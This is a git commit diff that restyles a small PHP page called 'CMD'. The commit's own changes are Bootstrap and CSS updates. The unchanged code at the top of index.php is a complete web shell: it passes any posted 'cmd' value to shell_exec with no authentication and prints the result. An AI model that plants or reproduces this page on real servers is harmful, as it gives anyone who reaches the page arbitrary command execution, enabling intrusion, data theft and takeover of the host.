75e2d8ab25143c12b2ecbe3a591c38fc1fae19a3
Artyum <didifsx@hotmail.fr>
2018-07-26 13:40:58 +0400

    updated bootstrap

--- index.php
+++ index.php
@@ -1,15 +1,11 @@
 <?php
-
 if (!empty($_POST['cmd'])) {
     $cmd = shell_exec($_POST['cmd']);
 }
-
 ?>
 <!DOCTYPE html>
 <html>
-    
-<!-- By ArtyumX (https://github.com/ArtyumX) -->
-
+<!-- By Artyum (https://github.com/artyuum) -->
 <head>
 
     <meta charset="utf-8">
@@ -17,12 +13,24 @@ if (!empty($_POST['cmd'])) {
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    
-    <link rel="stylesheet" type="text/css" href="//bootswatch.com/flatly/bootstrap.css">
+
+    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
 
     <title> CMD </title>
-    
+
     <style>
+        h2 {
+            color: rgba(0, 0, 0, .75);
+        }
+
+        pre {
+            padding: 15px;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            background-color: #ECF0F1;
+        }
+
         .container {
             width: 850px;
         }
@@ -32,30 +40,35 @@ if (!empty($_POST['cmd'])) {
 
 <body>
 
-<div class="container">
+    <div class="container">
 
-    <div class="page-header">
-        <h2> Execute a command </h2>
-    </div>
-
-    <form action="" method="POST">
-        <div class="form-group">
-            <label for="cmd">Command</label>
-            <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
+        <div class="pb-2 mt-4 mb-2">
+            <h2> Execute a command </h2>
         </div>
-        <button type="submit" class="btn btn-default">Execute</button>
-    </form>
+
+        <form action="" method="POST">
+            <div class="form-group">
+                <label for="cmd">Command</label>
+                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Execute</button>
+        </form>
 
 <?php if ($cmd): ?>
-    <div class="page-header">
-        <h2> Output </h2>
-    </div>
-    <pre>
+        <div class="pb-2 mt-4 mb-2">
+            <h2> Output </h2>
+        </div>
+        <pre>
 <?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
-    </pre>
+        </pre>
+<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
+        <div class="pb-2 mt-4 mb-2">
+            <h2> Output </h2>
+        </div>
+        <pre><small>No result.</small></pre>
 <?php endif; ?>
 
-</div>
+    </div>
 
 </body>
 
